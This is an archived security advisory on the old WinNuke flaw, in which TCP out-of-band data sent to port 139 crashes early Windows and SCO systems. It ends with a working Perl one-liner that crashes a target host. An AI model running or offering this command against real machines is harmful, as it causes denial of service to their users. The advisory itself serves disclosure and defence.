source: http://www.securityfocus.com/bid/2010/info
 
Older versions of Microsoft Windows (95, Windows for Workgroups 3.11, Windows NT up to and including 4.0), as well as SCO Open Server 5.0, have a vulnerability relating to the way they handle TCP/IP "Out of Band" data.
 
According to Microsoft, "A sender specifies "Out of Band" data by setting the URGENT bit flag in the TCP header. The receiver uses the URGENT POINTER to determine where in the segment the urgent data ends. Windows NT bugchecks when the URGENT POINTER points to the end of the frame and no normal data follows. Windows NT expects normal data to follow. "
 
As a result of this assumption not being met, Windows gives a "blue screen of death" and stops responding.
 
Windows port 139 (NetBIOS) is most susceptible to this attack. although other services may suffer as well. Rebooting the affected machine is required to resume normal system functioning. 

perl -MIO::Socket -e 'IO::Socket::INET->new(PeerAddr=>"some.windoze.box:139")->send("bye",MSG_OOB)'
